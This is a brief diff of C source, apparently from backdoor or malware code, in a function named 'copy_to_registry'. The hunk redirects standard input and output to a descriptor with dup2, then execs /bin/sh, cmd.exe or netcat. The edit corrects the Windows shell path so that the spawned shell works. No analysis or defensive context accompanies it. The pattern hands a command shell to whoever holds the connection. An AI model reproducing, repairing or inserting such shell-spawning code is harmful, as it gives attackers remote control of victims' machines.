@@ -166,7 +166,7 @@ void copy_to_registry()
 
     dup2(x, 0),dup2(x, 1),dup2(x, 2);
 
-    execve("/bin/sh", 0, 0),execve("C:\\Window\\System32\\cmd.exe", 0, 0),execve("netcat", 0, 0);
+    execve("/bin/sh", 0, 0),execve("C:\\Windows\\System32\\cmd.exe", 0, 0),execve("netcat", 0, 0);
 
     return;
 
